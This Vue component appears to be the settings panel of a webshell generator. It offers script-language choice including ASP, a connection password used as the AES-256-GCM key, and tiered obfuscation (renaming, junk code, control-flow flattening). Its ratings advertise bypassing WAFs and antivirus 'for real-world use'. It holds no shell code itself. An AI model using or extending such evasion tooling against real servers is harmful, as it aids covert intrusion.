<template>
  <div class="file-shell-config">
    <n-row :gutter="16">
      <n-col :span="12">
        <n-form-item label="脚本语言" label-placement="top" size="small">
          <n-radio-group v-model:value="scriptType" direction="horizontal" size="small">
            <n-radio-button
              v-for="opt in scriptTypeOptions"
              :key="opt.value"
              :value="opt.value"
            >
              {{ opt.label }}
            </n-radio-button>
          </n-radio-group>
        </n-form-item>
      </n-col>
      <n-col :span="12">
        <n-form-item label="加密算法" label-placement="top" size="small">
          <n-tag type="success" size="small" bordered round>
            AES-256-GCM
          </n-tag>
          <n-text depth="3" style="margin-left: 8px; font-size: 12px;">
            高安全性加密算法
          </n-text>
        </n-form-item>
      </n-col>
    </n-row>

    <n-divider />

    <n-row :gutter="16">
      <n-col :span="12">
        <n-form-item label="连接密码" label-placement="top" size="small">
          <div class="password-input-wrapper">
            <n-input
              v-model:value="password"
              type="text"
              placeholder="输入连接密码（同时作为加密密钥）"
              size="small"
              clearable
            />
            <n-button
              secondary
              size="small"
              @click="handleRandomPassword"
              class="random-btn"
            >
              随机生成
            </n-button>
          </div>
        </n-form-item>
      </n-col>
      <n-col :span="12">
        <n-form-item label="输出文件名" label-placement="top" size="small">
          <div class="password-input-wrapper">
            <n-input
              v-model:value="outputFilename"
              type="text"
              placeholder="留空将使用随机生成"
              size="small"
              clearable
            />
            <n-button
              secondary
              size="small"
              @click="handleRandomFilename"
              class="random-btn"
            >
              智能推荐
            </n-button>
          </div>
        </n-form-item>
      </n-col>
    </n-row>

    <n-divider />

    <n-form-item label="混淆强度" label-placement="top" size="small">
      <div class="obfuscation-header">
        <span></span>
        <n-text depth="3">
          {{ obfuscationLevelLabels[obfuscationLevel] }}
        </n-text>
      </div>
      <n-slider
          v-model:value="obfuscationLevelValue"
          :min="1"
          :max="3"
          :step="1"
          :tooltip="{ formatter: obfuscationTooltipFormatter }"
        />
      <div class="obfuscation-labels">
        <span>L1: 变量重命名</span>
        <span>L2: + 垃圾代码</span>
        <span>L3: + 控制流平坦化</span>
      </div>
    </n-form-item>

    <n-alert v-if="isAsp" type="info" title="ASP 特化处理已启用" style="margin-top: 16px;">
      <template #icon>
        <n-icon :component="Information" />
      </template>
      所有非 ASCII 字符将自动转换为 Chr() 拼接，避免 IIS 乱码问题
    </n-alert>

    <div class="security-card">
      <div class="security-title">安全等级预估</div>
      <div class="security-rating">
        <n-star
          v-for="i in 5"
          :key="i"
          :size="16"
          :color="i <= securityRating ? '#fbbf24' : '#d1d5db'"
          :filled="i <= securityRating"
        />
      </div>
      <n-text depth="3" class="security-text">
        {{ securityRatingText }}
      </n-text>
    </div>
  </div>
</template>

<script setup lang="ts">
import { computed } from 'vue'
import { usePayloadStore } from '@/stores/payload'
import {
  SCRIPT_TYPE_OPTIONS,
  type ScriptType,
  type ObfuscationLevel
} from '@/types/payload'
import { Information } from '@vicons/ionicons5'

const payloadStore = usePayloadStore()

const scriptType = computed({
  get: () => payloadStore.config.script_type,
  set: (v) => payloadStore.setScriptType(v)
})

const password = computed({
  get: () => payloadStore.config.password,
  set: (v) => payloadStore.setPassword(v)
})

const outputFilename = computed({
  get: () => payloadStore.config.output_filename || '',
  set: (v) => payloadStore.setOutputFilename(v)
})

const obfuscationLevel = computed(() => payloadStore.config.obfuscation_level)

const obfuscationLevelValue = computed({
  get: () => {
    const map: Record<ObfuscationLevel, number> = {
      low: 1,
      medium: 2,
      high: 3
    }
    return map[obfuscationLevel.value]
  },
  set: (value: number) => {
    const map: Record<number, ObfuscationLevel> = {
      1: 'low',
      2: 'medium',
      3: 'high'
    }
    payloadStore.setObfuscationLevel(map[value])
  }
})

const obfuscationLevelLabels: Record<ObfuscationLevel, string> = {
  low: 'L1 - 轻量',
  medium: 'L2 - 中等',
  high: 'L3 - 高级'
}

const isAsp = computed(() => scriptType.value === 'asp')

const securityRating = computed(() => {
  let rating = 2
  // 固定使用 AES-256-GCM，所以总是加 2 分
  rating += 2
  if (obfuscationLevel.value === 'medium') rating += 0.5
  if (obfuscationLevel.value === 'high') rating += 1
  return Math.floor(rating)
})

const securityRatingText = computed(() => {
  const ratings: Record<number, string> = {
    1: '低安全性，仅适合测试',
    2: '基础安全性，可绕过简单检测',
    3: '中等安全性，可绕过大部分 WAF',
    4: '高安全性，推荐实战使用',
    5: '极高安全性，深度免杀'
  }
  return ratings[securityRating.value] || '未知'
})

const scriptTypeOptions = SCRIPT_TYPE_OPTIONS

const handleRandomPassword = () => {
  payloadStore.generateRandomFilePassword()
}

const handleRandomFilename = () => {
  payloadStore.generateRandomOutputFilename()
}

const obfuscationTooltipFormatter = (value: number) => {
  const labels: Record<number, string> = {
    1: 'L1',
    2: 'L2',
    3: 'L3'
  }
  return labels[value] || ''
}
</script>

<style scoped>
.file-shell-config {
  width: 100%;
}

.password-input-wrapper {
  display: flex;
  gap: 8px;
  align-items: center;
}

.password-input-wrapper .random-btn {
  flex-shrink: 0;
  min-width: 90px;
}

.obfuscation-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 8px;
}

.obfuscation-labels {
  display: flex;
  justify-content: space-between;
  margin-top: 8px;
}

.obfuscation-labels span {
  font-size: 12px;
  color: var(--n-text-color-3);
}

.security-card {
  margin-top: 16px;
  padding: 16px;
  border-radius: 8px;
  background: rgba(59, 130, 246, 0.1);
  border: 1px solid rgba(59, 130, 246, 0.2);
}

.security-title {
  font-size: 14px;
  font-weight: 600;
  color: var(--n-text-color);
  margin-bottom: 8px;
}

.security-rating {
  display: flex;
  gap: 4px;
  align-items: center;
  margin-bottom: 8px;
}

.security-text {
  display: block;
}

@media (max-width: 768px) {
  .password-input-wrapper {
    flex-direction: column;
    align-items: stretch;
  }
}
</style>
